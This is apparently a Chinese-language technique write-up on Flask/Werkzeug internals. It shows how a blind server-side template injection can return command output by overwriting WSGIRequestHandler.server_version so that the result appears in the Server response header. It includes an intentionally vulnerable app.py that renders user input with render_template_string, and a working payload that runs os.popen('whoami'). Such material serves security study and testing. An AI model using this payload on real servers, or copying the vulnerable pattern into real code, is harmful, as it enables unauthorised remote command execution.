## Server请求头
### flask中的Server

flask中的server一共有三个,分别是
- ThreadedWSGIServer
- ForkingWSGIServer
- BaseWSGIServer

其中BaseWSGIServer是另外两个Server的父类,在make_server中存在决定使用哪个server的代码

```PYTHON
def make_server(  
    host: str,  
    port: int,  
    app: WSGIApplication,  
    threaded: bool = False,  
    processes: int = 1,  
    request_handler: type[WSGIRequestHandler] | None = None,  
    passthrough_errors: bool = False,  
    ssl_context: _TSSLContextArg | None = None,  
    fd: int | None = None,  
) -> BaseWSGIServer:  
    """Create an appropriate WSGI server instance based on the value of  
    ``threaded`` and ``processes``.  
    This is called from :func:`run_simple`, but can be used separately    to have access to the server object, such as to run it in a separate    thread.  
    See :func:`run_simple` for parameter docs.    """    if threaded and processes > 1:  
        raise ValueError("Cannot have a multi-thread and multi-process server.")  
  
    if threaded:  
        return ThreadedWSGIServer(  
            host, port, app, request_handler, passthrough_errors, ssl_context, fd=fd  
        )  
  
    if processes > 1:  
        return ForkingWSGIServer(  
            host,  
            port,  
            app,  
            processes,  
            request_handler,  
            passthrough_errors,  
            ssl_context,  
            fd=fd,  
        )  
  
    return BaseWSGIServer(  
        host, port, app, request_handler, passthrough_errors, ssl_context, fd=fd  
    )
```

flask的默认开启server为`ThreadedWSGIServer`,用于处理请求的handler默认为`WSGIRequestHandler`

而WSGIRequestHandler的server_version其实是方法,并且被`@property`修饰，所以可以直接给赋str类型的值
```PYTHON
class WSGIRequestHandler(BaseHTTPRequestHandler):  
  
    server: BaseWSGIServer  
  
    @property  
    def server_version(self) -> str:  # type: ignore  
        return self.server._server_version
```


### Payload

app.py 在代码中没有写ssti的回显部分

```PYTHON
from flask import Flask, request, render_template, render_template_string  
  
app = Flask(__name__)  
  
  
@app.route('/', methods=["POST"])  
def template():  
    template = request.form.get("ssti")  
    result = render_template_string(template)  
    print(result)  
    if result is not None:  
        return "OK"  
    else:  
        return "error"  
  
  
if __name__ == '__main__':  
    app.run(debug=False, host='0.0.0.0', port=8000)
```

可见在响应中存在Server请求头 `Server: Werkzeug/3.0.2 Python/3.11.5`

![](attachments/Pasted%20image%2020241130130625.png)


```SSTI
{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}
```

